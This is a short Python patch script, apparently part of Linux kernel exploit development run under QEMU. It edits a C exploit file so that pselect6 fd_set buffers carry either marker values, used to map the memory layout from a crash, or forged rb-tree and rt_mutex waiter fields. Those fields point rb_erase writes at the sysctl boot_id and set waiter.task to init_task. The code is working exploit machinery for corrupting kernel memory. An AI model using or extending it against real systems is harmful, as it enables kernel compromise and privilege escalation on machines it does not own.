import io
p = r'C:\Users\QingJ\Desktop\root\work\qemu\init_sweep.c'
src = io.open(p, encoding='utf-8').read()

# 标记模式: 所有 fdset word 填 0xC0DE000000000000+(字节偏移), 单轮, 只为读出布局
old = """static void build_overlay(int s){
  unsigned long parent = SCRATCH + 0x108;
  unsigned long lock   = SCRATCH;
  for(int k=0;k<WPS;k++){ inb[k]=0; outb[k]=0; exb[k]=0; }
  for(int f=0;f<13;f++){
    int i = s + f;
    if(i >= 3*WPS) continue;
    unsigned long v = 0;
    if(f==0)      v = parent;        /* tree.__rb_parent_color (写值) */
    else if(f==2) v = SYSCTL_BOOTID; /* tree.rb_left (rb_erase 写入目标) */
    else if(f==3) v = parent;        /* pi_tree.pc */
    else if(f==5) v = SYSCTL_BOOTID; /* pi_tree.left */
    else if(f==6) v = INIT_TASK;     /* waiter.task */
    else if(f==7) v = lock;          /* waiter.lock */
    else if(f==8) v = 3;             /* prio */
    else v = 0;
    if(i < WPS) inb[i]=v;
    else if(i < 2*WPS) outb[i-WPS]=v;
    else exb[i-2*WPS]=v;
  }
}"""
new = """#ifdef MARKER_MODE
static void build_overlay(int s){
  /* 标记模式: word i 的值编码其字节偏移 8*i, crash 寄存器直接反推布局 */
  for(int k=0;k<WPS;k++){ inb[k]=0; outb[k]=0; exb[k]=0; }
  for(int i=0;i<3*WPS;i++){
    unsigned long v = 0xC0DE000000000000UL + (unsigned long)(i*8);
    if(i < WPS) inb[i]=v;
    else if(i < 2*WPS) outb[i-WPS]=v;
    else exb[i-2*WPS]=v;
  }
}
#else
static void build_overlay(int s){
  unsigned long parent = SCRATCH + 0x108;
  unsigned long lock   = SCRATCH;
  for(int k=0;k<WPS;k++){ inb[k]=0; outb[k]=0; exb[k]=0; }
  for(int f=0;f<13;f++){
    int i = s + f;
    if(i >= 3*WPS) continue;
    unsigned long v = 0;
    if(f==0)      v = parent;
    else if(f==2) v = SYSCTL_BOOTID;
    else if(f==3) v = parent;
    else if(f==5) v = SYSCTL_BOOTID;
    else if(f==6) v = INIT_TASK;
    else if(f==7) v = lock;
    else if(f==8) v = 3;
    else v = 0;
    if(i < WPS) inb[i]=v;
    else if(i < 2*WPS) outb[i-WPS]=v;
    else exb[i-2*WPS]=v;
  }
}
#endif"""
assert old in src, 'build_overlay not found'
src = src.replace(old, new)

# waiter 的多轮循环改为单轮 (标记模式只需一轮)
old2 = """  for(int s=0; s<=3*(int)WPS-13; s++){
    build_overlay(s);
    open_selected();
    puts_("ROUND s="); putx_((unsigned long)s); puts_("\\n");
    long pts[2]={3,0};
    sys(SYS_pselect6,NFDS,(long)inb,(long)outb,(long)exb,(long)pts,0);
    show_bootid("BOOTID=");
  }"""
new2 = """  {
    build_overlay(0);
    open_selected();
    long pts[2]={5,0};
    sys(SYS_pselect6,NFDS,(long)inb,(long)outb,(long)exb,(long)pts,0);
  }"""
assert old2 in src, 'round loop not found'
src = src.replace(old2, new2)

io.open(p, 'w', encoding='utf-8').write(src)
print('MARKER_MODE added')
